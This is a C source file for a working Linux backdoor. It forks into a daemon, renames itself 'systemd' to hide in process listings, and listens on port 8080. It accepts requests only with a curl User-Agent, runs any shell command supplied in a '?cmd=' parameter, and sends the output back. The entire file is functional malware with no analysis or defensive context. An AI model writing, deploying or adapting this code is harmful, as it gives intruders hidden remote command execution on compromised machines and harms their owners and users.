#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define PORT 8080
#define BUF_SIZE 8192

void daemonize(const char *newname, int argc, char **argv) {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);  // Parent exits

    if (setsid() < 0) exit(1);

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    chdir("/");

    // Close standard fds
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect std fds to /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    // Change process name (shown in ps -o comm=)
    prctl(PR_SET_NAME, (unsigned long)newname, 0, 0, 0);

    // Overwrite argv[0] to newname (for ps aux)
    size_t len = strlen(argv[0]);
    memset(argv[0], 0, len);
    strncpy(argv[0], newname, len > strlen(newname) ? strlen(newname) : len);
}

int contains_curl_user_agent(const char *request) {
    const char *ua = strstr(request, "User-Agent:");
    if (!ua) return 0;

    ua += 11;
    while (*ua == ' ' || *ua == '\t') ua++;

    const char *end = strstr(ua, "\r\n");
    if (!end) end = ua + strlen(ua);

    size_t len = end - ua;
    char user_agent[256] = {0};
    if (len >= sizeof(user_agent)) len = sizeof(user_agent) - 1;
    strncpy(user_agent, ua, len);
    user_agent[len] = 0;

    if (strstr(user_agent, "curl") != NULL) return 1;
    return 0;
}

// Read full HTTP headers until \r\n\r\n or buffer full
ssize_t read_request(int fd, char *buf, size_t size) {
    ssize_t total = 0;
    while (total < (ssize_t)(size - 1)) {
        ssize_t r = read(fd, buf + total, 1);
        if (r <= 0) break;
        total += r;
        if (total >= 4 &&
            buf[total-4] == '\r' && buf[total-3] == '\n' &&
            buf[total-2] == '\r' && buf[total-1] == '\n') {
            break;
        }
    }
    buf[total] = 0;
    return total;
}

void send_response(int client_fd, const char *status, const char *content_type, const char *body) {
    dprintf(client_fd,
        "HTTP/1.1 %s\r\nContent-Type: %s\r\nContent-Length: %lu\r\n\r\n%s",
        status, content_type, strlen(body), body);
}

void handle_client(int client_fd) {
    char buffer[BUF_SIZE] = {0};
    if (read_request(client_fd, buffer, sizeof(buffer)) <= 0) {
        close(client_fd);
        return;
    }

    if (!contains_curl_user_agent(buffer)) {
        const char *forbidden = "403 Forbidden\nOnly libmoshpit.so client allowed.\n";
        send_response(client_fd, "403 Forbidden", "text/plain", forbidden);
        close(client_fd);
        return;
    }

    // Parse cmd param
    char *start = strstr(buffer, "GET /?cmd=");
    if (start) {
        start += 10;
        char *end = strchr(start, ' ');
        if (end) *end = 0;

        // Run command and capture output
        FILE *fp = popen(start, "r");
        if (!fp) {
            const char *failmsg = "Failed to run command.\n";
            send_response(client_fd, "500 Internal Server Error", "text/plain", failmsg);
            close(client_fd);
            return;
        }

        char output[BUF_SIZE] = {0};
        size_t offset = 0;
        while (fgets(output + offset, sizeof(output) - offset, fp) != NULL) {
            offset = strlen(output);
            if (offset >= sizeof(output) - 1) break;
        }
        pclose(fp);

        send_response(client_fd, "200 OK", "text/plain", output);
    } else {
        const char *usage = "HELL NA\n";
        send_response(client_fd, "200 OK", "text/plain", usage);
    }

    close(client_fd);
}

int main(int argc, char **argv) {
    daemonize("systemd", argc, argv);

    int server_fd, client_fd;
    struct sockaddr_in addr;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    // No printf because stdio closed after daemonize

    while (1) {
        socklen_t len = sizeof(addr);
        client_fd = accept(server_fd, (struct sockaddr*)&addr, &len);
        if (client_fd >= 0) handle_client(client_fd);
    }

    return 0;
}

